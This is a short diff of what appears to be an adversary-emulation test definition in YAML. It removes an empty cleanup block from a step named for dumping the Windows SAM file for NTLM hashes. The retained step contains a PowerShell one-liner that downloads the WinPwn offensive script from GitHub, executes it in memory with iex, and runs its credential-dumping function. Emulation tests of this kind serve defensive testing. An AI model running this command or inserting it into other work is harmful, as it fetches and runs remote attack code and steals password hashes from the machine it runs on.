@@ -16,6 +16,3 @@ steps:
     - name: winpwn---loot-local-credentials---dump-sam-file-for-ntlm-hashes
       inline: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  "
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
